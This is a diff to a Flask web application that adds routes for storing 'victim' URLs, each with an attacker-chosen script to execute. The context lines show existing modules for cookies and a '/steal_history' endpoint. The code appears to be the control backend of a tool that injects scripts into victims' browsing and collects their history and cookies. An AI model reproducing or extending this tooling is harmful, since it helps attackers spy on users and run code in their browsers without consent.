@@ -4,7 +4,7 @@ from flask import Flask, render_template, request, redirect, url_for, jsonify
 # Initial Database Dos
 import general_db
 
-from pyfiles import users, login, secure, history, cookies
+from pyfiles import users, login, secure, history, cookies, victim
 
 app = Flask(__name__)
 
@@ -15,10 +15,12 @@ def index():
     usrs = users.get_all_users()
     s = {}
     r = {}
+    v = {}
     for u in usrs:
         s[str(u)] = secure.getFromSecure(u)
         r[str(u)] = secure.getFromRandom(u)
-    return render_template("index.html", users = usrs, secure_urls = s, random_urls = r)
+        v[str(u)] = victim.getFromVictim(u)
+    return render_template("index.html", users = usrs, secure_urls = s, random_urls = r, victim_urls = v)
 
 @app.route('/online_check', methods=['POST'])
 def online_check(): 
@@ -69,6 +71,25 @@ def delete_random(email, url):
 @app.route('/get_random/<email>', methods=['GET'])
 def get_random(email):
     return jsonify(r=secure.getFromRandom(email))
+
+########### VICTIM ###########
+@app.route('/addVictim/<email>', methods=['POST'])
+def add_victim(email):
+    if request.method == 'POST':
+        url = request.form['victim_url']
+        script = request.form['execute-script']
+        victim.addToVictim(email, script, url)
+        return redirect(url_for('index'))
+
+@app.route('/deleteVictim/<email>/<url>/', methods=['POST'])
+def delete_victim(email, url):
+    if request.method == 'POST':
+        victim.removeFromVictim(email, url)
+        return redirect(url_for('index'))
+
+@app.route('/get_victim/<email>', methods=['GET'])
+def get_victim(email):
+    return jsonify(r=victim.getFromVictim(email))
 
 
 @app.route("/steal_history", methods=['POST'])
